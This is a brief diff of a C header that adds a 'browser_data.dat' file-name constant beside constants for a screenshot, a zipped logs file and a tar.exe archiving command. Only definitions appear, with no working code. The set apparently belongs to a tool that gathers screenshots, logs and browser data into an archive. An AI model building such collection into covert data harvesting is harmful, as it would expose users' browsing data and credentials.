@@ -5,5 +5,6 @@
 #define IMG_FILE "screenshot.bmp"
 #define ZIP_FILE "logsZipFile.zip"
 #define ZIP_EXEC_CMD "tar.exe -a -c -f "
+#define BROWSER_DAT_FILE_NAME "browser_data.dat"
 
 #endif
